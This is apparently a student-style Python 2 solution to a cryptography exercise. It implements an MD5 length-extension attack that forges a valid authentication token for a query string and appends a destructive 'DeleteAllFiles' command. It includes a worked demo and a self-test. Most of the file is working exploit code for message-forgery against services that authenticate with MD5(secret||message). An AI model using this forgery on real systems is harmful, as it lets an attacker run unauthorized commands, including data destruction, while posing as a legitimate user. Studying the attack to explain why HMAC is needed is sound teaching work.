from pymd5 import md5, padding
import sys
import binascii
from urllib import quote

# Example of length extension
"""
m = "Use HMAC, not hashes"
h = md5()
h.update(m)
print h.hexdigest()

h = md5(state="3ecc68efa1871751ea9b0b1a5b25004d".decode("hex"), count=512)

x = "Good advice"
h.update(x)
print h.hexdigest()

print ((md5(m+padding(len(m)*8)+x)).hexdigest())
"""

# token=3f6f43274846d627930c990a5d03d528&user=admin&command1=ListFiles&command2=NoOp
# token=hash&user=admin&command1=ListFiles&command2=NoOp&command3=DeleteAllFiles

# hash that we can use 3f6f43274846d627930c990a5d03d528
# password = 8 bytes long

# 8-byte passwrd || user=admin&command1=ListFiles&command2=NoOp => message is 8*(8+43) bits and adding is 4*26 bits, so count for new md5 should be 512

# password|| user=admin&command1=ListFiles&command2=NoOp||padding || &command3=DeleteAllFiles

# print(len(padding(8*8+43*8)))


with open(sys.argv[1]) as q:
    query_string = q.read()
    user_spot = query_string.find("user")
    query_part = query_string[user_spot:]
    hash_spot = query_string.find("token=")
    hash_string = query_string[hash_spot+6:hash_spot+38]

with open(sys.argv[2]) as c:
    command_string = c.read()

m_bit_len=(len(query_part)+8)*8
p=padding(m_bit_len)

bit_count=len(p)*8+m_bit_len

h = md5(state=hash_string.decode("hex"), count=bit_count)
h.update(command_string)
new_hash = h.hexdigest()

#print(new_hash)

attack_string = "token=" + new_hash + "&" + query_part+quote(p)+command_string

with open(sys.argv[3], "w") as w:
    w.write(attack_string)
    w.close()

# Test to see if it works
"""
original = md5("11112110"+query_part).hexdigest()
h_duplicate = md5(state=original.decode("hex"), count=bit_count)
h_duplicate.update(command_string)
print(h_duplicate.hexdigest())

print(md5("11112110"+query_part+p+command_string).hexdigest())
"""
